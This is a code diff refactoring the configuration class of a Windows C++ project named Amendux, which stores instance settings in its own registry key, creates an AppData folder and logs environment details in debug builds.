@@ -1,63 +1,74 @@
 #include "stdafx.h"
 #include "Log.h"
-#include "Encrypt.h"
 #include "RegDB.h"
 #include "Config.h"
 
 using namespace Amendux;
 
-std::wstring Config::instanceGUID = L"";
-bool Config::instanceUpdate = true;
+Config *Config::s_Config = nullptr;
 
-void Config::Init(Encrypt& encrypt)
+Config::Config()
 {
-	Log::Info(L"Config", L"Initialize config module");
+	Log::Info(L"Config", L"Initialize config class");
 
-	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
-	LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
-	LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
-	if (!dRsPubkey || !dRsPrivkey) {
-		encrypt.genLocalKeypair();
+	// Encrypt module settings
+	{
+		// HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
+		// LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
+		// LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
+		// if (!dRsPubkey || !dRsPrivkey) {
+		// encrypt.genLocalKeypair();
 
-		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", encrypt.clientPublickey(), crypto_box_PUBLICKEYBYTES);
-		RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", encrypt.clientPrivatekey(), crypto_box_SECRETKEYBYTES);
+		// RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", encrypt.clientPublickey(), crypto_box_PUBLICKEYBYTES);
+		// RegDB::setValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", encrypt.clientPrivatekey(), crypto_box_SECRETKEYBYTES);
 
-		Log::Info(L"Config", L"Client keys generated and set");
+		// Log::Info(L"Config", L"Client keys generated and set");
+		// }
+		// else {
+		// encrypt.setLocalKeypair(dRsPubkey, dRsPrivkey);
+		// }
 	}
-	else {
-		encrypt.setLocalKeypair(dRsPubkey, dRsPrivkey);
-	}
-
-	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Collect");
-	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"TempPath", 39 * sizeof(wchar_t));
-	if (!dRsTempPath) {
-		std::wstring guid = Util::generateUUID();
-		instanceGUID = guid;
-
-		LPCWSTR newTempPath = guid.c_str();
-		RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"TempPath", newTempPath, static_cast<DWORD>(Util::bytesInWCharStr(newTempPath)));
-	}
-	else {
-		instanceGUID = std::wstring(reinterpret_cast<wchar_t*>(dRsTempPath), 76 / sizeof(wchar_t));
-	}
-
-	hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Policies");
-
-	DWORD procInit = 1;
-	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));
-
-	DWORD execMode = 3;
-	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
-
-	ShowEnvironment();
-	InitDataDir();
 }
 
 
-void Config::ShowEnvironment()
+Config::~Config()
 {
+	Log::Info(L"Config", L"Terminate config class");
+}
+
+
+void Config::InitClass()
+{
+	Log::Info(L"Config", L"Mode: " + std::to_wstring((int)currentMode));
+
+	switch (currentMode) {
+		case Amendux::OperationMode::BASE:
+
+			SetupPersistentConfig();
+			SetupDataDir();
+
+			LogEnvironment();
+			break;
+		case Amendux::OperationMode::UPDATE:
+
+			CheckConfig();
+			break;
+		case Amendux::OperationMode::ELIMINATE:
+			break;
+		case Amendux::OperationMode::GUARD:
+			break;
+		default:
+			break;
+	}
+}
+
+
+void Config::LogEnvironment()
+{
+#ifdef DEBUG
 	PWCHAR sUserDir;
 
+	Log::Info(L"Config", L"[Env] PID: " + std::to_wstring(Util::currentProcessId()));
 	Log::Info(L"Config", L"[Env] Version: " + Config::getVersion());
 	Log::Info(L"Config", L"[Env] GUID: " + Config::instanceGUID);
 	Log::Info(L"Config", L"[Env] Windows version: " + Util::winver());
@@ -92,21 +103,68 @@ void Config::ShowEnvironment()
 
 	sUserDir = Util::getDirectory(Util::Directory::USER_VIDEOS);
 	Log::Info(L"Config", L"[Env] User videos: " + std::wstring(sUserDir));
+#endif
 }
 
 
-void Config::InitDataDir()
+void Config::SetupDataDir()
 {
 	std::wstring dataDir = std::wstring(Util::getDirectory(Util::Directory::USER_APPDATA));
-	if (CreateDirectory((dataDir + L"\\Amendux").c_str(), NULL) || ERROR_ALREADY_EXISTS == GetLastError()) {
-		// CopyFile(...)
-	} else {
+	if (!Util::createDirectory(dataDir + L"\\Amendux")) {
 		Log::Error(L"Config", L"Cannot create data directory");
+
+		bSuccess = false;
 	}
 }
 
 
-void Config::Terminate()
+void Config::SetupPersistentConfig()
 {
-	Log::Info(L"Config", L"Terminate config module");
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux");
+	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
+	if (!dRsTempPath) {
+		std::wstring guid = Util::generateUUID();
+		instanceGUID = guid;
+
+		LPCWSTR newTempPath = guid.c_str();
+		RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"Instance", newTempPath, static_cast<DWORD>(Util::bytesInWCharStr(newTempPath)));
+	} else {
+		instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
+	}
+
+	DWORD procInit = 1;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"InitProcedure", &procInit, sizeof(DWORD));
+
+	DWORD execMode = 3;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
+
+	DWORD build = clientVersion;
+	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"Build", &build, sizeof(DWORD));
+
+	RegDB::setValue<LPCWSTR>(hRoot, REG_SZ, L"DisplayName", L"Amendux", 7 * sizeof(wchar_t));
+}
+
+
+void Config::CheckConfig()
+{
+	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux");
+	LPBYTE dRsTempPath = RegDB::getValue<LPBYTE>(hRoot, REG_SZ, L"Instance", 39 * sizeof(wchar_t));
+	if (!dRsTempPath) {
+		bSuccess = false;
+		return;
+	}
+	
+	instanceGUID = std::wstring(reinterpret_cast<PWCHAR>(dRsTempPath), 76 / sizeof(wchar_t));
+
+	DWORD *procInit = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"InitProcedure", sizeof(DWORD));
+	if (!*procInit || *procInit != 1) {
+		bSuccess = false;
+		return;
+	}
+
+	DWORD *build = (DWORD *) RegDB::getValue<LPBYTE>(hRoot, REG_DWORD, L"Build", sizeof(DWORD));
+	if (!*build || *build >= clientVersion) {
+		bSuccess = false;
+		return;
+	}
 }
